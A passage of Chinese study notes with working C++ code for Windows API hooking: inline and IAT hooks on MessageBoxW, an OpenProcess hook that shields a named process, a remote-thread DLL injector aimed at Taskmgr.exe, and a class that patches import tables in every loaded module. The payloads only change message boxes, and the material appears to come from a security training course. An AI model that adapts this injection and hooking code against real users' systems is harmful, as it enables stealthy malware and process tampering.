要跳转的目标地址-hook点所在的地址-5\nDLL测试代码InLine_HOOK.h文件\n#pragma once\nvoid OnHook();\nvoid OffHook();\nvoid InitHook();\n\n.cpp文件\n#include &quot;HookMessageBox.h&quot;\n#include &lt;Windows.h&gt;\n\nunsigned char g_NewCode[5] &#x3D; &#123; 0xE9 &#125;;\nunsigned char g_OldCode[5] &#x3D; &#123;  &#125;;\nvoid OffHook();\nvoid OnHook();\nint WINAPI MyMessageBoxW(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType)\n&#123;\n\tlpText &#x3D; (wchar_t*)L&quot;你被打劫了^_^&quot;;\n\tDWORD dwReturnCode &#x3D; 0;\n\tOffHook();\n\tdwReturnCode &#x3D; MessageBoxW(hWnd, lpText, lpCaption, uType);\n\tOnHook();\n\treturn dwReturnCode;\n&#125;\nvoid InitHook()\n&#123;\n\t&#x2F;&#x2F;1 得到Hook的指令\n\tDWORD dwOffset &#x3D; (DWORD)MyMessageBoxW - (DWORD)MessageBoxW - 5;\n\t&#x2F;&#x2F;*(PDWORD)(code + 1) &#x3D; dwOffset;\n\tmemcpy(g_NewCode + 1, &amp;dwOffset, 4);\n\t&#x2F;&#x2F;2 得到原始的指令\n\tmemcpy(g_OldCode, MessageBoxW, 5);\n&#125;\n\nvoid OnHook()\n&#123;\n\n\t&#x2F;&#x2F;1 修改Hook点的属性\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(MessageBoxW, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t&#x2F;&#x2F;2 修改指令\n\tmemcpy(MessageBoxW, g_NewCode,5);\n\t&#x2F;&#x2F;3 属性还原\n\tVirtualProtect(MessageBoxW, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\n\nvoid OffHook()\n&#123;\n\t&#x2F;&#x2F;1 改属性\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(MessageBoxW, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t&#x2F;&#x2F;2 改指令\n\tmemcpy(MessageBoxW, g_OldCode, 5);\n\t&#x2F;&#x2F;3 属性还原\n\tVirtualProtect(MessageBoxW, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\ndllmain.cpp文件\n#include &quot;framework.h&quot;\n#include &quot;HookMessageBox.h&quot;\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n&#123;\n    switch (ul_reason_for_call)\n    &#123;\n    case DLL_PROCESS_ATTACH:\n\t&#123;\n\t\tInitHook();\n\t\tOnHook();\n\t&#125;\n\t\tbreak;\n    case DLL_THREAD_ATTACH:\n\t\tbreak;\n    case DLL_THREAD_DETACH:\n\t\tbreak;\n    case DLL_PROCESS_DETACH:\n\t&#123;\n\t\tOffHook();\n\t&#125;\n        break;\n    &#125;\n    return TRUE;\n&#125;\n\nIAT_HOOK.h文件\n#pragma once\n#include &lt;windows.h&gt;\nvoid IatHook(char* lpModuleAddress, DWORD FunAddress, const char* szTarFunName, const char* szTarDllName &#x3D; NULL);\nint WINAPI MyMessageBoxW(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType);\n\n.cpp文件\n#include &quot;IATHookMessageBoxW.h&quot;\n#include &lt;Windows.h&gt;\ntypedef int (WINAPI* MESSAGEBOX)(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType);\nMESSAGEBOX g_OldMessageBox;\n\nvoid IatHook(char* lpModuleAddress, DWORD FunAddress, const char* szTarFunName, const char* szTarDllName)\n&#123;\n\t&#x2F;&#x2F;1 获取到导入表结构\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpModuleAddress;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpModuleAddress);\n\t&#x2F;&#x2F;1 获取到导入表的数据目录结构\n\tPIMAGE_DATA_DIRECTORY dwImportDir &#x3D; &amp;pNt-&gt;OptionalHeader.DataDirectory[1];\n\t&#x2F;&#x2F;1 获取到导入表结构\n\tPIMAGE_IMPORT_DESCRIPTOR pImportTable &#x3D;\n\t\t(PIMAGE_IMPORT_DESCRIPTOR)(lpModuleAddress + dwImportDir-&gt;VirtualAddress);\n\t&#x2F;&#x2F;2 解析导入表\n\t\t&#x2F;&#x2F;2 开始解析\n\twhile (pImportTable-&gt;Name !&#x3D; 0)\n\t&#123;\n\n\t\tchar* pDllName &#x3D; (pImportTable-&gt;Name + lpModuleAddress);\n\t\tchar* pbuf &#x3D; new char[strlen(pDllName) + 1]&#123; 0 &#125;;\n\t\tstrcpy_s(pbuf, strlen(pDllName) + 1, pDllName);\n\t\t_strlwr_s(pbuf, strlen(pDllName) + 1);\n\t\tif (szTarDllName !&#x3D; NULL)\n\t\t&#123;\n\t\t\tif (strcmp(szTarDllName, pbuf) &#x3D;&#x3D; 0)\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;得到目标函数的地址\n\t\t\t\tHMODULE hModule &#x3D; GetModuleHandleA(pDllName);\n\t\t\t\tDWORD dwTarAddress &#x3D; (DWORD)GetProcAddress(hModule, szTarFunName);\n\t\t\t\t&#x2F;&#x2F;在IAT中寻找这个函数地址\n\t\t\t\tPIMAGE_THUNK_DATA32 pIat &#x3D; (PIMAGE_THUNK_DATA32)\n\t\t\t\t\t(pImportTable-&gt;FirstThunk + lpModuleAddress);\n\t\t\t\twhile (pIat-&gt;u1.Function!&#x3D;0)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F;找到了之后开始Hook，IAT也是不可写的\n\t\t\t\t\tif (pIat-&gt;u1.Function &#x3D;&#x3D; dwTarAddress)\n\t\t\t\t\t&#123;\n\n\t\t\t\t\t\t&#x2F;&#x2F;保存了一下MessageBox的地址。\n\t\t\t\t\t\tg_OldMessageBox &#x3D; (MESSAGEBOX)pIat-&gt;u1.Function;\n\t\t\t\t\t\t&#x2F;&#x2F;1 修改Hook点的属性\n\t\t\t\t\t\tDWORD dwOldProtect &#x3D; 0;\n\t\t\t\t\t\tVirtualProtect(&amp;pIat-&gt;u1.Function, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t\t\t\t\t\tpIat-&gt;u1.Function &#x3D; FunAddress;\n\t\t\t\t\t\tVirtualProtect(&amp;pIat-&gt;u1.Function, 4, dwOldProtect, &amp;dwOldProtect);\n\t\t\t\t\t&#125;\n\t\t\t\t\tpIat++;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t\tpImportTable++;\n\t&#125;\n&#125;\nint WINAPI MyMessageBoxW(\n\t_In_opt_ HWND hWnd,\n\t_In_opt_ LPCWSTR lpText,\n\t_In_opt_ LPCWSTR lpCaption,\n\t_In_ UINT uType)\n&#123;\n\tlpText &#x3D; (wchar_t*)L&quot;你被打劫了^_^&quot;;\n\tDWORD dwReturnCode &#x3D; 0;\n\tdwReturnCode &#x3D; g_OldMessageBox(hWnd, lpText, lpCaption, uType);\n\treturn dwReturnCode;\n&#125;\n\ndllmain.cpp\n#include &quot;framework.h&quot;\n#include &quot;IATHookMessageBoxW.h&quot;\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n&#123;\n    switch (ul_reason_for_call)\n    &#123;\n    case DLL_PROCESS_ATTACH:\n\t&#123;\n\t\tLPVOID ExeBase &#x3D; GetModuleHandle(0);\n\t\tIatHook((char*)ExeBase,(DWORD)MyMessageBoxW,&quot;MessageBoxW&quot;,&quot;user32.dll&quot;);\n\t&#125;\n\n\t\t\tbreak;\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    &#125;\n    return TRUE;\n&#125;\n\nProcess_HookDLL文件&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。\n#include &quot;stdafx.h&quot;\n#include &lt;TlHelp32.h&gt;\n\n&#x2F;&#x2F; 通过进程名获取进程id\nDWORD GetPid(const wchar_t* filePath);\n&#x2F;&#x2F; 获取helloworld程序pid\nDWORD g_dwPid &#x3D; GetPid(L&quot;FileCleaner2.0.exe&quot;);\n&#x2F;&#x2F; 旧的函数地址\nDWORD* g_pOldAddr &#x3D; (DWORD*)OpenProcess;\n&#x2F;&#x2F; 旧的函数数据\nchar g_oldCode[5] &#x3D; &#123;&#125;;\n\nvoid OnHook();\nvoid UnHook();\n\n&#x2F;&#x2F; 编写自己的OpenProcess函数\nHANDLE WINAPI MyOpenProcess(\n\t_In_ DWORD dwDesiredAccess,\n\t_In_ BOOL bInheritHandle,\n\t_In_ DWORD dwProcessId\n)\n&#123;\n\t&#x2F;&#x2F; 比对pid是否与helloworld程序相等\n\tif (dwProcessId &#x3D;&#x3D; g_dwPid)\n\t&#123;\n\t\tMessageBox(0,L&quot;进程被保护&quot;,L&quot;提示&quot;,0);\n\t&#125;\n\telse\n\t&#123;\n\t\t&#x2F;&#x2F; 如果不相等，重新调用原来的OpenProcess函数\n\t\t&#x2F;&#x2F; 先恢复原来函数数据\n\t\tUnHook();\n\t\tHANDLE hProcess &#x3D; OpenProcess(\n\t\t\tdwDesiredAccess, bInheritHandle, dwProcessId);\n\t\t&#x2F;&#x2F; 调用完之后重新hook\n\t\tOnHook();\n\t\treturn hProcess;\n\t&#125;\n&#125;\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n\tDWORD  ul_reason_for_call,\n\tLPVOID lpReserved\n)\n&#123;\n\tswitch (ul_reason_for_call)\n\t&#123;\n\tcase DLL_PROCESS_ATTACH:\n\t&#123;\n\t\tOnHook();\n\t\tMessageBox(NULL, L&quot;注入成功&quot;, L&quot;提示&quot;, NULL);\n\t\tbreak;\n\t&#125;\n\tcase DLL_THREAD_ATTACH:\n\tcase DLL_THREAD_DETACH:\n\tcase DLL_PROCESS_DETACH:\n\t\tbreak;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid OnHook()\n&#123;\n\t&#x2F;&#x2F; 1.先保存OpenProcess原来的数据\n\tmemcpy(g_oldCode, g_pOldAddr, 5);\n\n\t&#x2F;&#x2F; 2.设置新的指令,jmp\n\tchar opcode[5] &#x3D; &#123; 0xE9 &#125;;\n\t&#x2F;&#x2F; 2.1 计算偏移并赋值\n\t*(DWORD*)(opcode + 1) &#x3D; (DWORD)MyOpenProcess - (DWORD)OpenProcess - 5;\n\n\t&#x2F;&#x2F; 3.修改保护属性\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(g_pOldAddr, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\n\t&#x2F;&#x2F; 4.写入跳转指令\n\tmemcpy(g_pOldAddr, opcode, 5);\n\t\n\t&#x2F;&#x2F; 5.还原保护属性\n\tVirtualProtect(g_pOldAddr, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\nvoid UnHook()\n&#123;\n\t&#x2F;&#x2F; 1.修改保护属性\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(g_pOldAddr, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\t&#x2F;&#x2F; 2.还原旧的指令数据\n\tmemcpy(g_pOldAddr, g_oldCode, 5);\n\t&#x2F;&#x2F; 3.还原保护属性\n\tVirtualProtect(g_pOldAddr, 5, dwOldProtect, &amp;dwOldProtect);\n&#125;\n\nDWORD GetPid(const wchar_t* szExeName)\n&#123;\n\t&#x2F;&#x2F; 创建进程快照\n\tHANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\t&#x2F;&#x2F; 判断快照句柄是否有效\n\tif (hSnapshot !&#x3D; INVALID_HANDLE_VALUE)\n\t&#123;\n\t\t&#x2F;&#x2F;定义进程结构体，第一个元素必须赋值为结构体大小\n\t\tPROCESSENTRY32 stcPe32 &#x3D; &#123; sizeof(PROCESSENTRY32) &#125;;\n\t\t&#x2F;&#x2F;查找第一个进程\n\t\tProcess32First(hSnapshot, &amp;stcPe32);\n\t\tdo\n\t\t&#123;\t&#x2F;&#x2F; 如果进程名一致，返回进程id\n\t\t\tif (!wcscmp(stcPe32.szExeFile, szExeName))\n\t\t\t\treturn stcPe32.th32ProcessID;\n\n\t\t\t&#x2F;&#x2F;查找下一个进程\n\t\t&#125; while (Process32Next(hSnapshot, &amp;stcPe32));\n\t\t&#x2F;&#x2F;关闭快照句柄\n\t\tCloseHandle(hSnapshot);\n\t&#125;\n\treturn -1;\n&#125;\n\n测试文件&#x2F;&#x2F; 注入.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。\n&#x2F;&#x2F;\n\n#include &quot;pch.h&quot;\n#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\n#include &lt;TlHelp32.h&gt;\n\n#define DLLPATH &quot;C:\\\\Users\\\\hugan\\\\Documents\\\\15PB\\\\代码注入与拦截\\\\OD注入\\\\x64\\\\Debug\\\\InlineHook.dll&quot;\n&#x2F;&#x2F;#define DLLPATH &quot;D:\\\\041\\\\test\\\\Debug\\\\IatHook.dll&quot;\n\n&#x2F;&#x2F; 通过进程名获取进程id\nDWORD GetPid(const wchar_t* szExeName);\n\nint main()\n&#123;\n\t&#x2F;&#x2F; 1.获取目标进程句柄\n\t&#x2F;&#x2F; 1.1 获取指定进程id\n\tDWORD dwPid &#x3D; GetPid(L&quot;Taskmgr.exe&quot;);\n\t&#x2F;&#x2F; 1.2 打开进程（注入OD需要以管理员身份运行vs，否则无法打开进程)\n\tHANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);\n\t&#x2F;&#x2F; 1.3 检测进程句柄\n\tif (hProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE)\n\t\treturn -1;\n\n\t&#x2F;&#x2F; 2.1 计算dll路径长度\n\tDWORD dwSize &#x3D; strlen(DLLPATH) + 1;\n\t&#x2F;&#x2F; 2.在目标进程申请一段空间\n\tLPVOID lpAddr &#x3D; VirtualAllocEx(\n\t\thProcess, 0, dwSize, MEM_COMMIT, PAGE_READWRITE);\n\n\t&#x2F;&#x2F; 3.1 写入之前可以先测试加载一下看能否成功\n\t&#x2F;*HMODULE hMod &#x3D; LoadLibraryA(DLLPATH);\n\tMessageBoxW(0, 0, 0, 0);*&#x2F;\n\n\t&#x2F;&#x2F; 3.将dll名字写入到目标进程空间中\n\t&#x2F;&#x2F; 注意：路径与函数必须匹配，A版函数配A版字符串。如果用W版，写入的时候，长度要乘以2，\n\t\t&#x2F;&#x2F;\t因为wcslen求出的是字符串长度而不是字节数\n\tif (!WriteProcessMemory(hProcess, lpAddr, DLLPATH, dwSize, NULL))\n\t\treturn -1;\n\n\t&#x2F;&#x2F; 4.创建远程线程\n\tHANDLE hRtThread &#x3D; CreateRemoteThread(hProcess, NULL, 0,\n\t\t(LPTHREAD_START_ROUTINE)LoadLibraryA,lpAddr, NULL, NULL);\n\n\t&#x2F;&#x2F; 5.等待执行结果\n\tWaitForSingleObject(hRtThread, -1);\n\t\n\t&#x2F;&#x2F; 6.获取线程退出码\n\tDWORD dwExitCode &#x3D; 0;\n\tGetExitCodeThread(hRtThread, &amp;dwExitCode);\n\t&#x2F;&#x2F; 6.1 退出码也就是LoadLibrary的返回值（如果执行成功，就是dll的模块句柄）\n\tHMODULE hModule &#x3D; (HMODULE)dwExitCode;\n\n\t&#x2F;&#x2F; 7.释放空间\n\tif (!VirtualFreeEx(hProcess, lpAddr, dwSize, MEM_DECOMMIT))\n\t\treturn -1;\n\tCloseHandle(hProcess);\n\n\treturn 0;\n&#125;\n\nDWORD GetPid(const wchar_t* szExeName)\n&#123;\n\t&#x2F;&#x2F; 创建进程快照\n\tHANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\t&#x2F;&#x2F; 判断快照句柄是否有效\n\tif (hSnapshot !&#x3D; INVALID_HANDLE_VALUE)\n\t&#123;\n\t\t&#x2F;&#x2F;定义进程结构体，第一个元素必须赋值为结构体大小\n\t\tPROCESSENTRY32 stcPe32 &#x3D; &#123; sizeof(PROCESSENTRY32) &#125;;\n\t\t&#x2F;&#x2F;查找第一个进程\n\t\tProcess32First(hSnapshot, &amp;stcPe32);\n\t\tdo\n\t\t&#123;\t&#x2F;&#x2F; 如果进程名一致，返回进程id\n\t\t\tif (!wcscmp(stcPe32.szExeFile, szExeName))\n\t\t\t\treturn stcPe32.th32ProcessID;\n\n\t\t\t&#x2F;&#x2F;查找下一个进程\n\t\t&#125; while (Process32Next(hSnapshot, &amp;stcPe32));\n\t\t&#x2F;&#x2F;关闭快照句柄\n\t\tCloseHandle(hSnapshot);\n\t&#125;\n\treturn -1;\n&#125;\n\nCAPIHook函数封装#ifndef __APIHOOK_H__\n#define __APIHOOK_H__\n#include &lt;windows.h&gt;\nclass CAPIHook \n\n&#123;\n\npublic:\n       CAPIHook(LPSTR  pszModName, LPSTR pszFuncName,\n        PROC pfnHook, BOOL bExcludeAPIHookMod&#x3D;TRUE);\n       virtual ~CAPIHook();\n       operator PROC() &#123;return m_pfnOrig;&#125;\nprivate:\n\n       LPSTR m_pszModName;        &#x2F;&#x2F;导出要HOOK函数的模块的名字\n       LPSTR m_pszFuncName;  &#x2F;&#x2F;要HOOK的函数的名字\n       PROC m_pfnOrig;                  &#x2F;&#x2F;原API函数地址\n       PROC m_pfnHook;                &#x2F;&#x2F;HOOK后函数的地址\n       BOOL m_bExcludeAPIHookMod; &#x2F;&#x2F;是否将HOOK API的模块本身排除在外\nprivate:\n       static void ReplaceIATEntryInAllMods(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, BOOL bExcludeAPIHookMod);\n       static void ReplaceIATEntryInOneMod(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, HMODULE hModCaller);\n\n       &#x2F;&#x2F;下面的代码用来解决其他模块动态加载DLL的问题\nprivate:\n\n       &#x2F;&#x2F;这两个指针用来将所有的CAPIHook对象连在一起\n       static CAPIHook *sm_pHeader;\n       CAPIHook *m_pNext;\n\nprivate:\n\n       &#x2F;&#x2F;当一个新的DLL被加载时，调用此函数\n       static void WINAPI HookNewlyLoadedModule(HMODULE hModule, DWORD dwFlags);\n       &#x2F;&#x2F;用来跟踪当前进程加载新的DLL\n       static HMODULE WINAPI LoadLibraryA(PCSTR pszModulePath);\n       static HMODULE WINAPI LoadLibraryW(PCWSTR pszModulePath);\n       static HMODULE WINAPI LoadLibraryExA(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags);\n       static HMODULE WINAPI LoadLibraryExW(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags);\n       &#x2F;&#x2F;如果请求已HOOK的API函数，则返回用户自定义函数的地址\n       static FARPROC WINAPI GetProcAddress(HMODULE hModule, PCSTR pszProcName); \n\nprivate:\n       &#x2F;&#x2F;自动对这些函数进行挂钩\n       static CAPIHook sm_LoadLibraryA;\n       static CAPIHook sm_LoadLibraryW;\n       static CAPIHook sm_LoadLibraryExA;\n       static CAPIHook sm_LoadLibraryExW;\n       static CAPIHook sm_GetProcAddress;\n&#125;;\n\n#endif\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;APIHook.cpp&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\n#include &quot;APIHook.h&quot;\n#include &quot;Tlhelp32.h&quot;\n#include &lt;ImageHlp.h&gt;  &#x2F;&#x2F;为了调用ImageDirectoryEntryToData函数\n#pragma comment(lib, &quot;ImageHlp&quot;)\n\n&#x2F;&#x2F;CAPIHook对象链表的头指针\nCAPIHook *CAPIHook::sm_pHeader &#x3D; NULL;\nCAPIHook::CAPIHook(LPSTR pszModName, LPSTR pszFuncName,PROC pfnHook, BOOL bExcludeAPIHookMod&#x2F;* &#x3D;TRUE *&#x2F;)\n&#123;\n       &#x2F;&#x2F;保存这个Hook函数的信息\n       m_bExcludeAPIHookMod &#x3D; bExcludeAPIHookMod;\n       m_pszModName &#x3D; pszModName;\n       m_pszFuncName &#x3D; pszFuncName;\n       m_pfnHook &#x3D; pfnHook;\n       m_pfnOrig &#x3D; ::GetProcAddress(::GetModuleHandle(pszModName), pszFuncName);\n\n       &#x2F;&#x2F;将此对象添加到链表中\n       m_pNext &#x3D; sm_pHeader;\n       sm_pHeader &#x3D; this;\n       &#x2F;&#x2F;在所有当前已加载的模块中HOOK这个函数\n       ReplaceIATEntryInAllMods(m_pszModName, m_pfnOrig, m_pfnHook, bExcludeAPIHookMod);\n&#125; \n\nCAPIHook::~CAPIHook()\n&#123;\n       &#x2F;&#x2F;取消对所有模块中函数的HOOK\n       ReplaceIATEntryInAllMods(m_pszModName, m_pfnHook, m_pfnOrig,  m_bExcludeAPIHookMod);\n       CAPIHook *p &#x3D; sm_pHeader;\n\n       &#x2F;&#x2F;从链表中移除此对象\n       if(p &#x3D;&#x3D; this)\n       &#123;\n              sm_pHeader &#x3D; p-&gt;m_pNext;\n       &#125;\n       else\n       &#123;\n              while(p !&#x3D; NULL)\n              &#123;\n                     if(p-&gt;m_pNext &#x3D;&#x3D; this)\n                     &#123;\n                            p-&gt;m_pNext &#x3D; this-&gt;m_pNext;\n                            break;\n                     &#125;\n                     p &#x3D; p-&gt;m_pNext;\n              &#125;\n       &#125;     \n&#125; \n\nvoid CAPIHook::ReplaceIATEntryInOneMod(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, HMODULE hModCaller)\n&#123;\n       &#x2F;&#x2F;取得模块的导入表(import descriptor)的首地址\n       &#x2F;&#x2F;ImageDirectoryEntryToData函数可以返回导入表地址\n       ULONG ulSize;\n       PIMAGE_IMPORT_DESCRIPTOR pImportDesc &#x3D;(PIMAGE_IMPORT_DESCRIPTOR)::ImageDirectoryEntryToData(hModCaller, TRUE,IMAGE_DIRECTORY_ENTRY_IMPORT, &amp;ulSize);\n\n       if(pImportDesc &#x3D;&#x3D; NULL)      &#x2F;&#x2F;这个模块没有导入表项\n              return;  \n\n       &#x2F;&#x2F;查找包含pszExportMod模块中函数导入信息的导入表项\n       while(pImportDesc-&gt;Name !&#x3D; 0)\n       &#123;\n              LPSTR pszMod &#x3D; (LPSTR)((DWORD)hModCaller + pImportDesc-&gt;Name);\n              if (lstrcmpi(pszMod, pszExportMod) &#x3D;&#x3D; 0)    \n              &#123;\n                     break;\n              &#125;\n              pImportDesc++;\n       &#125;\n       if (pImportDesc-&gt;Name &#x3D;&#x3D; 0)    &#x2F;&#x2F;hModCaller模块没有从pszExportMod模块导入任何函数\n       &#123;\n              return;\n       &#125;\n\n       &#x2F;&#x2F;取得调用者的导入地址表(import address table, IAT)\n       PIMAGE_THUNK_DATA pThunk &#x3D; (PIMAGE_THUNK_DATA)(pImportDesc-&gt;FirstThunk +  (DWORD)hModCaller);\n\n       &#x2F;&#x2F;查找我们要HOOK的函数，将它的地址用新函数的地址替换掉\n       while (pThunk-&gt;u1.Function)\n       &#123;\n              &#x2F;&#x2F;lpAddr指向的内存保存了函数的地址\n              PDWORD lpAddr &#x3D; (PDWORD)&amp;(pThunk-&gt;u1.Function);\n              if (*lpAddr &#x3D;&#x3D; (DWORD)pfnCurrent)\n              &#123;\n                     &#x2F;&#x2F;修改页的保护属性\n                     DWORD dwOldProtect;\n                     MEMORY_BASIC_INFORMATION mbi;\n                     ::VirtualQuery(lpAddr, &amp;mbi, sizeof(mbi));\n                     ::VirtualProtect(lpAddr, sizeof(DWORD), PAGE_READWRITE, &amp;dwOldProtect);\n \n\n                     &#x2F;&#x2F;修改内存地址，相当于&quot;lpAddr &#x3D; (DWORD)pfnNew;&quot;\n                     ::WriteProcessMemory(::GetCurrentProcess(), lpAddr,  &amp;pfnNew, sizeof(DWORD), NULL);\n                     ::VirtualProtect(lpAddr, sizeof(DWORD), dwOldProtect, 0);\n                     break;\n              &#125;\n              pThunk++;\n       &#125;\n&#125;\n\n \n\nvoid CAPIHook::ReplaceIATEntryInAllMods(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, BOOL bExcludeAPIHookMod)\n&#123;\n       &#x2F;&#x2F;取得当前模块的句柄\n       HMODULE hModThis &#x3D; NULL;\n       if(bExcludeAPIHookMod)\n       &#123;\n              MEMORY_BASIC_INFORMATION mbi;\n              if(::VirtualQuery(ReplaceIATEntryInAllMods, &amp;mbi, sizeof(mbi)) !&#x3D; 0)\n                     hModThis &#x3D; (HMODULE)mbi.AllocationBase;\n       &#125;\n\n       &#x2F;&#x2F;取得本进程的模块列表\n       HANDLE hSnap &#x3D; ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ::GetCurrentProcessId());\n \n\n       &#x2F;&#x2F;遍历所有模块，分别对它们调用ReplaceIATEntryInOnMod函数，修改导入地址表\n       MODULEENTRY32 me &#x3D; &#123;sizeof(MODULEENTRY32)&#125;;\n       BOOL bOK &#x3D; ::Module32First(hSnap, &amp;me);\n       while (bOK)\n       &#123;\n              &#x2F;&#x2F;注意，我们不HOOK当前模块的函数\n              if (me.hModule !&#x3D; hModThis)\n              &#123;\n                    ReplaceIATEntryInOneMod(pszExportMod, pfnCurrent, pfnNew, me.hModule);\n              &#125;\n\n              bOK &#x3D; ::Module32Next(hSnap, &amp;me);\n       &#125;\n       ::CloseHandle(hSnap);\n&#125;\n\n \n\n&#x2F;&#x2F;挂钩LoadLibrary和GetProcAddress函数，以便在这些函数被调用以后，挂钩的函数也能够被正确的处理\nCAPIHook CAPIHook::sm_LoadLibraryA(&quot;Kernel32.dll&quot;, &quot;LoadLibraryA&quot;, (PROC)CAPIHook::LoadLibraryA, TRUE);\nCAPIHook CAPIHook::sm_LoadLibraryW(&quot;Kernel32.dll&quot;, &quot;LoadLibraryW&quot;, (PROC)CAPIHook::LoadLibraryW, TRUE);\nCAPIHook CAPIHook::sm_LoadLibraryExA(&quot;Kernel32.dll&quot;, &quot;LoadLibraryExA&quot;,(PROC)CAPIHook::LoadLibraryExA, TRUE);\nCAPIHook CAPIHook::sm_LoadLibraryExW(&quot;Kernel32.dll&quot;, &quot;LoadLibraryExW&quot;,(PROC)CAPIHook::LoadLibraryExW, TRUE);\nCAPIHook CAPIHook::sm_GetProcAddress(&quot;Kernel32.dll&quot;, &quot;GetProcAddress&quot;, (PROC)CAPIHook::GetProcAddress, TRUE);\n\nvoid WINAPI CAPIHook::HookNewlyLoadedModule(HMODULE hModule, DWORD dwFlags)\n&#123;\n       &#x2F;&#x2F;如果一个新的模块被加载，挂钩各CAPIHook对象要求的API函数\n       if((hModule !&#x3D; NULL) &amp;&amp; ((dwFlags&amp;LOAD_LIBRARY_AS_DATAFILE) &#x3D;&#x3D; 0))\n       &#123;\n              CAPIHook *p &#x3D; sm_pHeader;\n              while (p !&#x3D; NULL)\n              &#123;\n                     ReplaceIATEntryInOneMod(p-&gt;m_pszModName, p-&gt;m_pfnOrig, p-&gt;m_pfnHook, hModule);\n                     p &#x3D; p-&gt;m_pNext;\n              &#125;\n       &#125;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryA(PCSTR pszModulePath)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryA(pszModulePath);\n       HookNewlyLoadedModule(hModule, 0);\n       return hModule;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryW(PCWSTR pszModulePath)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryW(pszModulePath);\n       HookNewlyLoadedModule(hModule, 0);\n       return hModule;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryExA(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryExA(pszModulePath, hFile, dwFlags);\n       HookNewlyLoadedModule(hModule, dwFlags);\n       return hModule;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryExW(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryExW(pszModulePath, hFile, dwFlags);\n       HookNewlyLoadedModule(hModule, dwFlags);\n       return hModule;\n&#125;\n\n \n\nFARPROC WINAPI CAPIHook::GetProcAddress(HMODULE hModule, PCSTR pszProcName)\n&#123;\n       &#x2F;&#x2F;得到函数的真实地址\n       FARPROC pfn &#x3D; ::GetProcAddress(hModule, pszProcName);\n       &#x2F;&#x2F;看它是否我们要HOOK的函数\n       CAPIHook *p &#x3D; sm_pHeader;\n       while(p !&#x3D; NULL)\n       &#123;\n              if (p-&gt;m_pfnOrig &#x3D;&#x3D; pfn)\n              &#123;\n                     pfn &#x3D; p-&gt;m_pfnHook;\n                     break;\n              &#125;\n              p &#x3D; p-&gt;m_pNext;\n       &#125;\n       return 